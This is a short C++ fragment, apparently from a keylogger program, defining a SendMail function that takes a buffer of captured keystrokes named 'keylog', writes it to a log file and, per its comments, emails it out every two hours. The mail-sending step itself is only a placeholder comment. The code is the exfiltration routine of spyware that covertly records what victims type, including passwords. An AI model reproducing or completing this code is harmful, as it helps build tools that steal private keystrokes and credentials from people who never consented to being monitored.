#include "Hook.h"

void SendMail()
{
	//attempt to send email every 2 hours
	if (keylog.empty())
		return;

	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty())
	{
		Helper::DetectErrorLog("File creation failed " + keylog);
		return;
	}
	//send Mail
}